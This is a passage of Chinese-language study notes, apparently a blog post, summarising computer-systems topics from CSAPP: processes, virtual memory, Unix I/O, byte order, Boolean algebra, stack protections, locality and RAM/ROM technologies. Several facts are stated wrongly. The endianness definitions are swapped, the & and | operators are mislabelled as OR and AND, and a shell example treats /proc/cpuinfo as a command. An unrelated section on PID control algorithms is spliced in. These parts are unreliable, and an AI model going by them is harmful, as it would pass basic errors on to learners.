<p>这种假象就是：逻辑控制流，它仿佛可以控制程序的逻辑行为，一步一步的流向，可以使用<strong>流程图</strong>来表现这种行为的流动，方便了调试人员对程序执行流程的把控</p>
<h2 id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h2><p>系统中的逻辑流有多种不同的形式：异常处理，进程，信号处理，线程，java进程……</p>
<p>并发流：在时间上，一个逻辑流和另一个逻辑流冲突，这两个流并发运行</p>
<p>并发：多条流在同时执行的一般现象</p>
<p>多任务（时间分片）：多个进程流量执行的现象</p>
<h2 id="私有地址空间"><a href="#私有地址空间" class="headerlink" title="私有地址空间"></a>私有地址空间</h2><p>私有地址空间也是进程提供的假象，好像程序在单独地使用系统地址空间一样</p>
<p>​        // 私有地址空间是虚拟内存的子集</p>
<p>每个进程都会为所对应的程序提供一份“私有地址空间”，每个“私有地址空间”完全一致，并且只能被所对应的程序访问</p>
<h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><p>Unix提供了大量从C程序中操作进程的系统调用</p>
<h2 id="僵死进程"><a href="#僵死进程" class="headerlink" title="僵死进程"></a>僵死进程</h2><p>当一个进程因为某种原因终止后，内核并不会马上把它清除，而是等待它的父进程把它回收</p>
<p>一个终止了但是还没有被回收的进程被称为<strong>僵死进程</strong></p>
<p>如果一个进程的父进程终止了，内核会安排“init进程”成为它的“养父”（代替父进程回收子进程）</p>
<p>​        // “init进程”的PID为“1”，“调度进程”（系统进程）的PID为“0”</p>
<h2 id="PID算法"><a href="#PID算法" class="headerlink" title="PID算法"></a>PID算法</h2><p>PID，就是“比例（proportional）、积分（integral）、微分（derivative）” </p>
<p>PID控制应该算是应用非常广泛的控制算法，小到控制一个元件的温度，大到控制无人机的飞行姿态和飞行速度等等，都可以使用PID控制。这里我们从原理上来理解PID控制</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1642074027298-1646286364492-1646808754596-1646808862601.png" class> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1642074041508-1646286364492-1646808754596-1646808862601.png" class width="1642074041508"> 
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程（英语：thread）是操作系统能够进行<strong>运算调度</strong>的最小单位 </p>
<p>线程被包含在进程之中，是进程中的实际运作单位 </p>
<p>​        // <strong>多线程</strong> 比 <strong>多进程</strong> 跟高效 </p>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>虚拟内存为每个进程提供了一个<strong>假象</strong></p>
<p>就好像每个进程在<strong>单独占用</strong>内存空间一样，每个进程中看到的内存是一样的（虚拟地址空间）</p>
<p>即：该进程是系统资源中唯一的对象</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639410537327-1640976664503-1646286364492-1646808754596-1646808862602.png" class width="1639410537327">   
<p>物理内存是不连续的，但是操作系统完成了“使内存看起来是连续的”这样一份抽象，创造了 <strong>虚拟内存</strong> ，并且为虚拟内存中的各个空间进行了编号</p>
<ul>
<li>虚拟内存<strong>用户空间</strong>每个进程各一份</li>
<li>虚拟内存<strong>内核空间</strong>所有进程共享一份</li>
<li>虚拟内存 mmap 段中的<strong>动态链接库</strong>仅在物理内存中装载一份</li>
</ul>
<p><strong>虚拟内存的作用</strong></p>
<p>硬件只能识别“物理地址”，而“物理地址”是不连续的并且不方便显示，这就给调试程序带来了巨大的影响</p>
<p>所以操作系统抽象出了“虚拟内存”，把硬件中的数据映射到“虚拟内存”中，方便了调试</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641630776102-1646286364493-1646808754596-1646808862602.png" class width="1641630776102">  
<h2 id="虚拟内存作为缓存工具"><a href="#虚拟内存作为缓存工具" class="headerlink" title="虚拟内存作为缓存工具"></a>虚拟内存作为缓存工具</h2><p>VM系统（虚拟程序系统）将虚拟内存分割成块，这些块被称为虚拟页</p>
<p>每个虚拟页的大小为“P = 2的p次方”字节，类似地，物理内存被分割为物理页，大小也为P字节（物理页也被称为“页帧”）</p>
<p>在任意时刻，虚拟页面的集合都分为3个不相交的子集：</p>
<ul>
<li>未分配的：VM系统还未分配的页，没有数据和它们相关，不占用磁盘空间</li>
<li>缓存的：当前已缓存在物理内存中的已分配页</li>
<li>未缓存的：当前未缓存在物理内存中的已分配页</li>
</ul>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1644400609758-1646657383403-1646808754596-1646808862602.png" class width="1644400609758"> 
<h2 id="Proc文件系统"><a href="#Proc文件系统" class="headerlink" title="Proc文件系统"></a>Proc文件系统</h2><p>Proc文件系统是一个伪文件系统，它只存在于内存中（不占用外存空间），允许“用户模式进程”访问“内核数据结构”的内容</p>
<p>Proc文件系统将许多“内核数据结构”的内容输出为一个用户程序可以读的“文本文件”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /proc/cpuinfo				<span class="comment"># 输出CPU属性</span></span><br></pre></td></tr></table></figure>
<h2 id="Unix-I-O"><a href="#Unix-I-O" class="headerlink" title="Unix I/O"></a>Unix I/O</h2><p>一个 Linux 文件就是一个 m 个字节的序列，所有的 I/O 设备（例如网络、磁盘和终端）都被模型化为文件，而所有的输入和输出都被当作对相应文件的读和写来执行</p>
<p>这种将设备优雅地映射为文件的方式，允许 Linux 内核引出一个简单、低级的应用接口，称为 Unix I/O，这使得所有的输入和输出都能以一种统一且一致的方式来执行：</p>
<ul>
<li><strong>打开文件</strong>：一个应用程序通过要求内核打开相应的文件，来宣告它想要访问一个 I/O 设备，内核返回一个小的非负整数，叫做 <strong>描述符</strong> ，它在后续对此文件的所有操作中标识这个文件，内核记录有关这个打开文件的所有信息，应用程序只需记住这个描述符</li>
<li><strong>改变当前的文件位置</strong>：对于 <strong>每个打开的文件</strong> ，内核保持着一个 <strong>文件位置</strong>（符号为 k），初始为 0，这个文件位置是 <strong>从文件开头起始的字节偏移量（相当于“指向”内存中文件末尾的一个标记，也可以用来记录该文件在内存中的大小）</strong>，应用程序能够通过执行 seek 操作，显式地设置文件的当前位置为 k</li>
<li><strong>读写文件</strong>：一个读操作就是 <strong>从文件复制 n &gt; 0 个字节到内存（从当前文件位置 k 开始，然后将 k 增加到 k+n）</strong> ，假设给定一个大小为 m 字节的文件，当 k&gt;=m 时（文件被完全读入内存）会触发一个称为 end-of-file（EOF）的条件，应用程序能检测到这个条件，在文件结尾处并没有明确的“EOF符号”，类似地，写操作就是 <strong>从内存复制 n &gt; 0 个字节到一个文件）从当前文件位置 k 开始，然后更新 k）</strong></li>
<li><strong>关闭文件</strong>：当应用完成了对文件的访问之后，它就通知内核关闭这个文件，作为响应，<strong>内核释放文件打开时创建的数据结构，并将这个描述符恢复到可用的描述符池中</strong>，无论一个进程因为何种原因终止时，内核都会关闭所有打开的文件并释放它们的内存资源</li>
</ul>
<p>Linux shell 创建的每个进程开始时都有三个打开的文件：<strong>标准输入</strong>（描述符为 0）、<strong>标准输出</strong>（描述符为 1）和 <strong>标准错误</strong>（描述符为 2），头文件  定义了常量 STDIN_FILENO、STDOUT_FILENO 和 STDERR_FILENO，它们可用来代替显式的描述符值</p>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>文件就是 <strong>字节序列</strong></p>
<p>系统中所有的输入输出都是通过使用 <strong>Unix I/O</strong> 的 <strong>系统函数</strong> 来实现的，文件向应用程序提供了一个 <strong>统一的视图</strong> ，来看待系统中可能含有的各种形式的 <strong>I/O设备</strong>，在linux操作系统中有一个思想“一切皆文件”，即使是内存中的进程都可以被当成文件输出</p>
<p>每个 Linux 文件都有一个 <strong>类型</strong>（type）来表明它在系统中的角色： </p>
<ul>
<li><strong>普通文件</strong>（regular file）：包含任意数据，应用程序常常要区分 <strong>文本文件</strong> 和 <strong>二进制文件 </strong> ，文本文件是只含有 ASCII 或 Unicode 字符的普通文件，二进制文件是所有其他的文件<ul>
<li>对内核而言，文本文件和二进制文件没有区别</li>
<li>Linux 文本文件包含了一个 <strong>文本行</strong>（text line）序列，其中每一行都是一个字符序列，以一个新行符（“\n”）结束</li>
<li>新行符与 ASCII 的换行符（LF）是一样的，其数字值为 0x0a</li>
</ul>
</li>
<li><strong>目录</strong>（directory）：是包含一组 <strong>链接</strong> 的文件，其中每个链接都将一个 <strong>文件名</strong> 映射到一个文件，这个文件可能是另一个目录<ul>
<li>每个目录至少含有两个条目：是到该目录自身的链接，以及是到目录层次结构中 <strong>父目录</strong> 的链接</li>
<li>你可以用 mkdir 命令创建一个目录，用 Is 查看其内容，用 rmdir 删除该目录</li>
</ul>
</li>
<li><strong>套接字</strong>（socket）：是用来与另一个进程进行跨网络通信的文件</li>
</ul>
<p>其他文件类型包含 <strong>命名通道</strong> （named pipe）、  <strong>符号链接</strong> （symbolic link），以及 <strong>字符和块设备</strong> （character and block device）</p>
<h2 id="RIO-健壮地读写"><a href="#RIO-健壮地读写" class="headerlink" title="RIO-健壮地读写"></a>RIO-健壮地读写</h2><p>我们会讲述一个 I/O 包，称为 RIO（Robust I/O，健壮的 I/O）包，它会自动为你处理上文中所述的不足值，在像网络程序这样容易出现不足值的应用中，RIO 包提供了方便、健壮和高效的 I/O</p>
<p>RIO 提供了两类不同的函数： </p>
<ul>
<li><strong>无缓冲的输入输出函数</strong>：这些函数直接在内存和文件之间传送数据，没有应用级缓冲，它们对将二进制数据读写到网络和从网络读写二进制数据尤其有用</li>
<li><strong>带缓冲的输入函数</strong>：这些函数允许你高效地从文件中读取文本行和二进制数据，这些文件的内容缓存在应用级缓冲区内，类似于为 printf 这样的标准 I/O 函数提供的缓冲区<ul>
<li>与【110】中讲述的带缓冲的 I/O 例程不同，带缓冲的 RIO 输入函数是线程安全的，它在同一个描述符上可以被交错地调用</li>
<li>例如，你可以从一个描述符中读一些文本行，然后读取一些二进制数据，接着再多读取一些文本行</li>
</ul>
</li>
</ul>
<h2 id="共享文件"><a href="#共享文件" class="headerlink" title="共享文件"></a>共享文件</h2><p>可以用许多不同的方式来共享 Linux 文件，内核用三个相关的数据结构来表示打开的文件： </p>
<ul>
<li><strong>描述符表</strong>（descriptor table）：每个进程都有它独立的描述符表，它的表项是由进程打开的文件描述符来索引的。每个打开的描述符表项指向文件表中的一个表项</li>
<li><strong>文件表</strong>（file table）：打开文件的集合是由一张文件表来表示的，所有的进程共享这张表，每个文件表的表项组成：<ul>
<li>包括当前的 <strong>文件位置</strong> 、<strong>引用计数</strong>（reference count）（即当前指向该表项的描述符表项数），以及一个 <strong>指向 v-node 表</strong> 中对应表项的指针</li>
<li>关闭一个描述符会减少相应的文件表表项中的引用计数</li>
<li>内核不会删除这个文件表表项，直到它的引用计数为零</li>
</ul>
</li>
<li><strong>v-node 表</strong>（v-node table）：同文件表一样，所有的进程共享这张 v-node 表，每个表项包含 stat 结构中的大多数信息，包括 st_mode 和 st_size 成员</li>
</ul>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>系统并不是由 <strong>孤立的</strong> 硬件和软件组成的结合体，而是可以通过 <strong>网络</strong> 相互通信</p>
<p>对于一个单独的系统而言，网络可以认为是一个<strong>I/O设备</strong>（输入或输出数据到本机）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639411220256-1640976664503-1646286364492-1646808754596-1646808862602.png" class width="1639411220256"> 
<h2 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h2><p>计算机的发展始终围绕两个目的：1.更多    2.更快</p>
<p><strong>并发</strong>：指一个同时具有多活动的系统</p>
<p><strong>并行</strong>：指使用 <strong>并发</strong> 来使一个系统运行得更快</p>
<p>并行可以在计算机系统的多个 <strong>抽象层次</strong> 中运用，其中最主要的有3个：</p>
<p><strong>1.线程级并发</strong></p>
<p>构建在进程这个抽象之上，我们可以设计出有多个 <strong>“程序执行工具”</strong> 的系统，这导致了 <strong>并行</strong></p>
<p>这个“程序执行工具”就是线程，使用线程，我们甚至可以在一个进程中执行多个 <strong>控制流</strong></p>
<p><strong>2.指令级并行</strong></p>
<p>构建在较低的抽象层次上，使处理器可以<strong>同时执行</strong>多条指令</p>
<p><strong>3.单指令，多数据并行</strong></p>
<p>构建在较最的抽象层次上，允许一条指令可以产生多个<strong>“并行执行”</strong>的操作</p>
<p>​        //即<strong>SIMD</strong>并行</p>
<h2 id="指令集架构"><a href="#指令集架构" class="headerlink" title="指令集架构"></a>指令集架构</h2><p>指令集架构（InstructionSetArchitecture）</p>
<p>描述：指的是CPU机器码所使用的指令的集合以及其背后的寄存器体系、总线设计等逻辑框架 ，也是规定的一系列CPU与其他硬件电路相配合的指令系统 </p>
<p>作用：定义 <strong>机器级程序</strong> 的格式和行为，它定义了 <strong>处理器状态</strong> ， <strong>指令的格式</strong> ，以及 <strong>每条指令的影响</strong></p>
<p>行为：每条指令<strong>顺序执行</strong>，一条指令完成后，另一条指令开始</p>
<p>​        //不同进程中的指令会被CPU<strong>并发</strong>处理，但是就一个进程而言，它的指令是<strong>“顺序执行”</strong>的</p>
<h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h2><p>大端序：符合人类的认知（低地址存低位，高地址存高位）</p>
<p>小端序：利用机器的运算（低地址存高位，高地址存低位）</p>
<p>为了方便阅读程序，我们通常把低地址写在上面，把高地址写在下面</p>
<p>​        // 这样小端序就“符合人类的认知”</p>
<p>不同的系统采用不同的<strong>字节序</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_show_bytes</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ival = val;</span><br><span class="line">    <span class="keyword">float</span> fval = (<span class="keyword">float</span>) ival;</span><br><span class="line">    <span class="keyword">int</span> *pval = &amp;ival;</span><br><span class="line">    show_int(ival);</span><br><span class="line">    show_fload(fval);</span><br><span class="line">    show_pointer(pval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639568507336-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1639568507336"> 
<h2 id="布尔代数"><a href="#布尔代数" class="headerlink" title="布尔代数"></a>布尔代数</h2><p>将逻辑值True和False用二进制值“1”和“0”表示，设计出了一种代数</p>
<p>基础逻辑运算：“ ~ ”（非），“ &amp; ”（或），“ | ”（与），“ ^ ”（异或）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639569041012-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1639569041012"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639569059817-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1639569059817"> 
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>过程是软件中一种很重要的抽象，它提供了一种 <strong>封装</strong> 代码的方式，用一组 <strong>指定的参数</strong> 和一个 <strong>可选择的返回值</strong> 实现了某种功能，而程序可以在任何一个位置引用这种功能</p>
<p>设计良好的软件用 <strong>过程</strong> 作为抽象机制，隐藏某个行为的具体表现，同时又提供清晰简洁的 <strong>接口定义</strong> ，说明需要计算的是哪些值，过程会对程序状态产生什么影响</p>
<p>过程在不同的<strong>编译语言</strong>中有不同的名称：函数（Function），方法（method），子例程，处理函数</p>
<h2 id="嵌套数组-amp-变长数组"><a href="#嵌套数组-amp-变长数组" class="headerlink" title="嵌套数组&amp;变长数组"></a>嵌套数组&amp;变长数组</h2><p>嵌套数组：（多维数组）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> A[<span class="number">5</span>][<span class="number">3</span>]</span><br><span class="line">------------------------</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> row3_[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">row3_t</span> A[<span class="number">5</span>];</span><br></pre></td></tr></table></figure>
<p>两者是等价的</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640064445176-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640064445176"> 
<p>变长数组：</p>
<p>变长数组既数组大小待定的数组， C语言中结构体的最后一个元素可以是大小未知的数组，也就是所谓的0长度，所以我们可以用结构体来创建变长数组 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[];</span><br><span class="line">&#125;SoftArray;</span><br></pre></td></tr></table></figure>
<h2 id="异质的数据结构"><a href="#异质的数据结构" class="headerlink" title="异质的数据结构"></a>异质的数据结构</h2><p>c语言提供了两种不同类型的对象组合到一起创建数据类型的机制：</p>
<p>1.结构（structure）    2.联合（union）</p>
<p>structure可以将多个对象集合到一个单位中</p>
<p>union可以用几种不同的类型来引用一个对象</p>
<h2 id="缓存区保护"><a href="#缓存区保护" class="headerlink" title="缓存区保护"></a>缓存区保护</h2><p>1.栈随机化</p>
<p>使栈在每一次加载时都会发生变化</p>
<p>对抗：空操作雪橇，在shellcode前面插入相等长度的“nop”，只要有一个地址命中“nop”就行</p>
<p>​        //汇编指令“nop”让IP指针+1，没有其他作用</p>
<p>2.栈破坏机制</p>
<p>Canary（金丝雀）是系统生成的一个随机数，如果它被破坏，系统就会强行终止程序</p>
<p>3.限制可执行权限</p>
<h2 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h2><p>以“ . ”开头的指令就是 <strong>伪指令</strong> ，它们告诉汇编器<strong>调整地址</strong>，以便在那里产生代码或插入一些数据</p>
<p>例如：伪指令“.pos 0”告诉汇编器应该从地址“0”开始产生代码</p>
<h2 id="控制语言-HCL"><a href="#控制语言-HCL" class="headerlink" title="控制语言(HCL)"></a>控制语言(HCL)</h2><p>大多数现代的电路技术都是用<strong>信号线上的高低电压</strong>来表示不同的值</p>
<p>​        //逻辑1用1.0伏特的高电压，逻辑0用0.0伏特的低电压</p>
<p>为了方便编程，<strong>硬件描述语言HDL</strong>（Hardware Description Language）诞生了</p>
<p>HDL是一种文本表示，和编程语言类似，但是它是用来描述 <strong>硬件结构</strong> 而不是 <strong>程序行为</strong> 的</p>
<p>HCL语言只表达硬件设计的<strong>控制逻辑</strong>部分，只有有限的操作集合（控制逻辑是处理器中最困难的）</p>
<h2 id="逻辑门"><a href="#逻辑门" class="headerlink" title="逻辑门"></a>逻辑门</h2><p>逻辑门是数字电路的基本计算单元，它们的产生和输出，等于它们输入位数的某个布尔函数</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640840566258-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640840566258"> 
<h2 id="组合电路"><a href="#组合电路" class="headerlink" title="组合电路"></a>组合电路</h2><p>将很多的逻辑门组合成一个网，就可以构建出一个<strong>计算块</strong>（computational block），称为组合电路</p>
<h2 id="优化编译器的能力"><a href="#优化编译器的能力" class="headerlink" title="优化编译器的能力"></a>优化编译器的能力</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640841353636-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640841353636"> 
<p>这两个函数有相同的功能，但CPU读写效率却有不同：</p>
<p>第一个函数需要：2次读 <em>xp，2次读 </em>yp，2次写 *xp</p>
<p>第二个函数需要：1次读 <em>xp，1次读 </em>yp，1次写 *xp</p>
<h2 id="程序性能的表示"><a href="#程序性能的表示" class="headerlink" title="程序性能的表示"></a>程序性能的表示</h2><p>我们引入度量标准：<strong>每元素的周期数</strong>（Cycles Per Element），作为一种表示程序性能并指引我们改进代码的方法</p>
<p>处理器活动的顺序是由时钟控制的，时钟提供了某个频率的规律信号，通常用<strong>千兆赫兹</strong>，十亿周期每秒来表示</p>
<p>例如：一个系统有“4GHz”处理器，表示这个系统的处理器时钟运行频率为<strong>4 * 10的9次方 /每秒</strong></p>
<h2 id="存储器系统"><a href="#存储器系统" class="headerlink" title="存储器系统"></a>存储器系统</h2><p>存储器系统是一个具有不同<strong>容量，成本，访问时间</strong>的存储设备层次结构</p>
<p>靠近CPU的，小的，快速的，称为<strong>高速缓存存储器</strong></p>
<p>这个思想围绕着计算机程序的一种称为 <strong>局部性</strong> 的基本属性，具有良好局部性的程序倾向于一次又一次地访问相同的 <strong>数据项集合</strong> ，或是倾向访问邻近的 <strong>数据项集合</strong> ，并且更多的倾向于从存储器层次结构中较高层次处访问 <strong>数据项集合</strong> ，这些操作都可以使程序运行得更快</p>
<h2 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h2><p><strong>简述</strong></p>
<p>原指处理器在访问某些数据时短时间内存在重复访问，某些数据或者位置访问的 <strong>概率极大</strong> ，大多数时间只访问局部的数据（随着优化技术的提升，局部性的概念也得到了扩充）</p>
<p>其实就是概率的不均等，这个宇宙中，很多东西都不是平均分布的，平均分布是概率论中几何分布的一种特殊形式，非常简单，但世界就是没这么简单。我们更长听到的发布叫做高斯发布，同时也被称为正态分布，因为它就是正常状态下的概率发布，起概率图如下 ：</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640843878222-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640843878222"> 
<p><strong>时间局部性(Temporal locality):</strong> </p>
<p>如果某个信息这次被访问，那它有可能在不久的未来被多次访问</p>
<p>时间局部性是空间局部性访问地址一样时的一种特殊情况，这种情况下，可以把常用的数据加<strong>cache</strong>（缓存）来优化访存</p>
<p><strong>空间局部性(Spatial locality):</strong> </p>
<p>如果某个位置的信息被访问，那和它相邻的信息也很有可能被访问到</p>
<p>这个也很好理解，我们大部分情况下代码都是顺序执行，数据也是顺序访问的 </p>
<p><strong>内存局部性(Memory locality):</strong> </p>
<p>访问内存时，大概率会访问连续的块，而不是单一的内存地址，其实就是 <strong>空间局部性在内存上</strong> 的体现</p>
<p>目前计算机设计中，都是以块/页为单位管理调度存储，其实就是在利用空间局部性来优化性能 </p>
<p><strong>分支局部性(Branch locality)</strong> </p>
<p>这个又被称为顺序局部性，计算机中大部分指令是顺序执行，即便有if这种选择分支，其实大多数情况下某个分支都是被大概率选中的</p>
<p>于是就有了CPU的分支预测优化，设计CPU优先选择 <strong>概率较大 </strong>的if分支</p>
<p><strong>等距局部性(Equidistant locality)</strong> </p>
<p>等距局部性是指如果某个位置被访问，那和它 <strong>相邻等距离的连续地址</strong> 极有可能会被访问到，它位于空间局部性和分支局部性之间</p>
<p>举个例子，比如多个相同格式的数据数组，你只取其中每个数据的一部分字段，那么他们可能在内存中地址距离是等距的，这个可以通过简单的线性预测就预测是未来访问的位置</p>
<p><strong>步长对局部性的影响</strong></p>
<p>步长：连续序列号的差值</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641115117925-1646286364493-1646808754596-1646808862602.png" class width="1641115117925"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641115127425-1646286364493-1646808754596-1646808862602.png" class width="1641115127425"> 
<p>两个函数只是交互了循环的次序，但程序的性能却截然不同</p>
<p>第一个程序：步长为“4”（int类型） [ 4 - 0 ]</p>
<p>第二个程序：步长为“12”（int类型 * 3）[ 12 - 0 ]</p>
<p>第一个程序的性能远高于第二个程序（步长越长，性能越差）</p>
<h2 id="存储技术"><a href="#存储技术" class="headerlink" title="存储技术"></a>存储技术</h2><p><strong>静态RAM</strong>（SRAM）</p>
<p>SRAM将每个<strong>位</strong>存储在一个 <strong>双稳态</strong> 的存储器单元中（每个单元通常是用一个 <strong>6晶体管电路</strong> 来实现的）</p>
<p>这个电路有这样一个属性：它可以无限期地保持 “两个不同的电压配置” 中的一个</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640849464616-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640849464616"> 
<p>这个<strong>双稳态</strong>的存储器单元就像图中的钟摆一样，除了左右稳态以外的任何区域都是不稳定的</p>
<p>只要有电，它就会永远保持它的值，即使有外界干扰也会马上回复</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641013069193-1646286364493-1646808754596-1646808862602.png" class width="1641013069193"> 
<p><strong>动态RAM</strong>（DRAM）</p>
<p>DRAM将每个<strong>位</strong>存储为一个 <strong>电容的充电</strong>（每个单元由一个 <strong>电容</strong> 和一个 <strong>访问晶体管</strong> 组成）</p>
<p>和SRAM有着较强的稳定性不同，DRAM对干扰非常敏感，电容电压被扰乱以后就不会恢复了</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640850052720-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640850052720"> 
<p>DRAM芯片被封装在内存模块中</p>
<p>内存模块 (Memory Module)是指一个 <strong>印刷电路板</strong> 表面上有镶嵌数个 <strong>记忆体</strong> ， <strong>芯片chips</strong>(碎片)，而这 内存芯片 通常是 DRAM芯片</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641013117768-1646286364493-1646808754596-1646808862602.png" class width="1641013117768"> 
<p><strong>增强型DRAM</strong></p>
<p>快页模式DRAM（FPM DRAM）</p>
<p>扩展数据DRAM（EDO DRAM）</p>
<p>同步DRAM（SDRAM）</p>
<p>双倍数据速率同步DRAM（DDR SDRAM）</p>
<p>视频RAM（VRAM）</p>
<p><strong>只读存储器ROM</strong>（ROM是一种非易失性存储器）</p>
<p>如果计算机突然断电，DRAM和SRAM都会失去它们的数据，所以它们是<strong>易失的</strong></p>
<p>在失去电源的情况下，数据也不会丢失的存储器就是<strong>非易失性存储器</strong></p>
<p>最开始的ROM是真的“只读”的，但是随着技术的发展，ROM也慢慢“可读”了起来</p>
<p><strong>可编程ROM</strong>（PROM）</p>
<p>PROM只能每编程一次（PROM的每个存储器单元都有一种熔丝（fuse），只能被高温熔断一次）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641013659516-1646286364493-1646808754596-1646808862602.png" class width="1641013659516"> 
<p><strong>可擦写可编程ROM</strong>（EPROM）</p>
<p>EPROM有一个透明的石英窗口，允许光线到达存储单元，当紫外线射过窗口时，EPROM单元会被清除为“0”，对EPROM的编程需要通过特殊设备（把“1”写入EPROM），EPROM总共可以擦除重编程的次数为：10的3次方</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640852450140-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640852450140"> 
<p><strong>电子可擦除PROM</strong>（EEPROM）</p>
<p>EEPROM和EPROM类似，只不过不用特殊设备就可以对它进行编程，可以直接在印制电路卡上进行编程，EEPROM总共可以被编程的次数为：10的5次方</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640852477583-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640852477583"> 
<p><strong>闪存</strong>（flash memory）</p>
<p>闪存基于EEPROM，是一种重要的存储技术（U盘就是利用Flash实现的）</p>
<p>与前面的PROM，EPROM，EEPROM以 <strong>位</strong> 为单位不同，Flash以 <strong>块</strong> 为单位（128kb，256kb）</p>
<p>Flash的基本构成单位为<strong>浮栅场效应管</strong>（这是一个三端器件，分别为：源极，漏极，栅极）</p>
